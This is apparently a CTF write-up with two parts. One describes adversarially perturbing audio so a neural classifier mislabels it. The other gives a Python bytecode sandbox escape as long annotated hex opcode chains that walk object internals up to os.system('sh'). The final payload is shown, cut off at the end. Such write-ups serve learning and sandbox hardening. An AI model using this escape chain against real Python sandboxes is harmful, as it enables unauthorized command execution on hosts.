看到random了吧，就是随机往里写点随机的数据。这样居然真的可以，只是因为题目条件比较苛刻，向左很难成功欺骗。（比赛时有两个师傅提到向左不能伪造，听了他们伪造的音频，估计是用了相似的手段。） 

下面是预期解，先放上两个参考文档，分别是介绍神经网络欺骗和mfcc转wav的python实现： 

[https://medium.com/@ageitgey/machine-learning-is-fun-part-8-how-to-intentionally-trick-neural-networks-b55da32b7196](https://medium.com/@ageitgey/machine-learning-is-fun-part-8-how-to-intentionally-trick-neural-networks-b55da32b7196)

[https://amyang.xyz/posts/Inverse-MFCC-to-WAV](https://amyang.xyz/posts/Inverse-MFCC-to-WAV)

(后来才知道 librosa已经有mfcc_to_audio方法了 ) 

主要思路是使用给出的模型识别example.wav，根据预测出的偏移反向传播调整音频。因为使用MFCC生成wav中间会有损耗，所以我的做法是利用wav生成的MFCC数据进行预测并不停地反向调整example.wav的MFCC原数据。这听起来有些绕口，具体见 脚本 ，（修改object_type_to_fake来修改欺骗的类型。） 

[https://gist.github.com/yikongge/40ed9bde7cc7616244afcfa9aed31e1e](https://gist.github.com/yikongge/40ed9bde7cc7616244afcfa9aed31e1e)

[https://share.weiyun.com/ilFwLKnc](https://share.weiyun.com/ilFwLKnc)

（本题解法不唯一，这可能不是最优解，其他解法请自行检索 

最后上传的问题不知道大家是不是做上一题时就有解决，前端自己加一个上传按钮就行了，或者用requests做...方法很多 外放估计行不通了。 

## Python_is_fun 

### tricks 

1 利用 `LOAD_BUILD_CLASS` opcode 获取一个 `__build_class__` 函数的实例 

2 利用 `FORMAT_VALUE` (f''格式化字符串的实现)将 `__build_class__` 函数变成字符串 

3 True+True=2，2//2=1，利用 `DUP_TOP` 复制1并相加得到想要的数字 

4 利用 `__doc__` 获取更多字符 

1 Use `LOAD_BUILD_CLASS` opcode to get a instance of function `__build_class__` 

2 Use `FORMAT_VALUE` opcode (the implementation of f-string) to turn `__build_class__` function into str 

3 True + True = 2, 2 // 2 = 1, use `DUP_TOP` opcode to get amount of `1` we want and add them together to get a int 

4 Use `__doc__` to get more char 

### shellcode编写过程 

```plain
#步骤1：获取第一部分字符串 '<built-in function __build_class__><built-in function getattr>' 
LOAD_BUILD_CLASS,0,4700,#"无中生有"一个__build_class__函数，此时栈顶存在一个BUILD_CLASS函数 
FORMAT_VALUE,1,9b01,#此时build_class函数被变成字符串，可以用来slice '<built-in function __build_class__>' 
LOAD_CONST,0,6400,#将栈上的getattr顺便也拿出来当字符串'<built-in function getattr>' 
FORMAT_VALUE,1,9b01,# 
BUILD_STRING,2,9d02,#将两个格式化字符串合并，并且这个字符串放到栈顶  
#步骤2：获取__build_class__.__doc__并且拼接到原字符串上，获取更多字符 
#__doc__ = 原字符串[20,20,25,16,13,20,20] 
#获得第一个_ 
DUP_TOP,0,0400 
#构造数字:首先调用两次LOAD_BUILD_CLASS拿到两个BUILD_CLASS函数，进行比较获得一个True，复制一个True并且相加得到2，复制一个2并且相除（INPLACE_FLOOR_DIVIDE）得到1，复制想要个个数的1然后相加得到想要的数字 
构造数字,20,470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037003700 
BINARY_SUBSCR,0,1900 
ROT_TWO,0,0200 
#获得第二个_ 
DUP_TOP,0,0400 
构造数字,20,470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037003700 
BINARY_SUBSCR,0,1900 
#此时 栈顶-栈底 _ 字符串 _ 
ROT_THREE,0,0300 
ROT_THREE,0,0300 
BUILD_STRING,2,9d02 
ROT_TWO,0,0200 
#此时 栈顶-栈底 字符串 __ 
#现在获得了__，重复此操作直到拿到__doc__ 
重复操作,N/A,0400470047006b020400370004001c000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d020200 
ROT_TWO,0,0200 
#此时 栈顶-栈底 __doc__ 字符串 
LOAD_BUILD_CLASS,0,4700 
ROT_TWO,0,0200 
LOAD_CONST,0,6400,#拿出getattr 
ROT_THREE,0,0300 
CALL_FUNCTION,2,8302 
BUILD_STRING,2,9d02 
#现在有字符串 '<built-in function __build_class__><built-in function getattr>__build_class__(func, name, *bases, metaclass=None, **kwds) -> class\n\nInternal helper function used by the class statement.' 
#步骤3：用类似逃逸的方式拿到__import__，拿到os,system,执行sh，或者利用PRINT_EXPR opcode，orw flag并且输出 
#getattr(__build_class__,'__class__') 
#getattr(p,'__mro__') 
#p[1] 
#getattr(p,'__subclasses__') 
#p() 
#p[爆破数字，找到有builtins的类] 
#getattr(p,'__init__') 
#getattr(p,'__globals__') 
#p['builtins'] 
#p['__import__'] 
#p('os') 
#getattr(p,'system') 
#p('sh') 
构造__class__字符串,N/A,0400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d020200 
ROT_TWO,0,0200 
LOAD_CONST,0,6400 
LOAD_BUILD_CLASS,0,4700 
ROT_THREE,0,0300 
ROT_THREE,0,0300 
CALL_FUNCTION,2,8302 
#现在 栈顶-栈底 <class 'builtin_function_or_method'> 字符串 
ROT_TWO,0,0200 
构造__mro__字符串,N/A,0400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d020200 
ROT_THREE,0,0300 
LOAD_CONST,0,6400 
ROT_THREE,0,0300 
CALL_FUNCTION,2,8302 
#现在 栈顶-栈底 (<class 'builtin_function_or_method'>, <class 'object'>) 字符串 
构造数字,1,470047006b020400370004001c00 
BINARY_SUBSCR,0,1900 
ROT_TWO,0,0200 
构造__subclasses__字符串,N/A,0400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c001900030003009d0202000400470047006b020400370004001c00040037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d020200 
ROT_THREE,0,0300 
LOAD_CONST,0,6400 
ROT_THREE,0,0300 
CALL_FUNCTION,2,8302 
CALL_FUNCTION,0,8300,#调用__subclasses__方法的实例 
构造数字,91,470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700 
BINARY_SUBSCR,0,1900 
ROT_TWO,0,0200 
构造__init__字符串,N/A,0400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040037003700370037001900030003009d0202000400470047006b020400370004001c0004000400370037001900030003009d0202000400470047006b020400370004001c00040004000400040004000400040037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d020200 
ROT_THREE,0,0300 
LOAD_CONST,0,6400 
ROT_THREE,0,0300 
CALL_FUNCTION,2,8302 
ROT_TWO,0,0200 
构造__globals__字符串,N/A,0400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d020200 
ROT_THREE,0,0300 
LOAD_CONST,0,6400 
ROT_THREE,0,0300 
CALL_FUNCTION,2,8302 
ROT_TWO,0,0200 
构造builtins字符串,N/A,0400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c00040004000400040004000400040037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400370037001900030003009d0202000400470047006b020400370004001c00040004000400040037003700370037001900030003009d0202000400470047006b020400370004001c000400040004003700370037001900030003009d0202000400470047006b020400370004001c0004000400370037001900030003009d0202000400470047006b020400370004001c00040037001900030003009d0202000400470047006b020400370004001c001900030003009d020200 
ROT_THREE,0,0300 
BINARY_SUBSCR,0,1900 
ROT_TWO,0,0200 
构造__import__字符串,N/A,0400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d020200 
ROT_THREE,0,0300 
LOAD_CONST,0,6400 
ROT_THREE,0,0300 
CALL_FUNCTION,2,8302 
#此时已经拿到了__import__方法 
ROT_TWO,0,0200 
构造os字符串,N/A,0400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037001900030003009d020200 
ROT_THREE,0,0300 
CALL_FUNCTION,1,8301 
ROT_TWO,0,0200 
构造system字符串,N/A,0400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d020200 
ROT_THREE,0,0300 
LOAD_CONST,0,6400 
ROT_THREE,0,0300 
CALL_FUNCTION,2,8302 
ROT_TWO,0,0200 
构造sh字符串,N/A,0400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d020200 
ROT_THREE,0,0300 
CALL_FUNCTION,1,8301,#执行了os.system("sh")，getshell 
RETURN_VALUE,0,5300 
```
### 最终构造好的shellcode 

```plain
47009b0164009b019d020400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000200470002006400030083029d020400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d02020002006400470003000300830202000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000300640003008302470047006b020400370004001c00190002000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c001900030003009d0202000400470047006b020400370004001c00040037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d02020003006400030083028300470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040037003700370037001900030003009d0202000400470047006b020400370004001c0004000400370037001900030003009d0202000400470047006b020400370004001c00040004000400040004000400040037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d020200030064000300830202000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700190002000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004003700370037001900030003009d0202000400470047006b020400370004001c00040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c001900030003009d0202000400470047006b020400370004001c000400040004000400040004000400040004000400040004000400040004003700370037003700370037003700370037003700370037003700370037001900030003009d0202000400470047006b020400370004001c000400040004003700370037001900030003009d0202000400470047006b020400370004001c0004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400040004000400370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037003700370037001900030003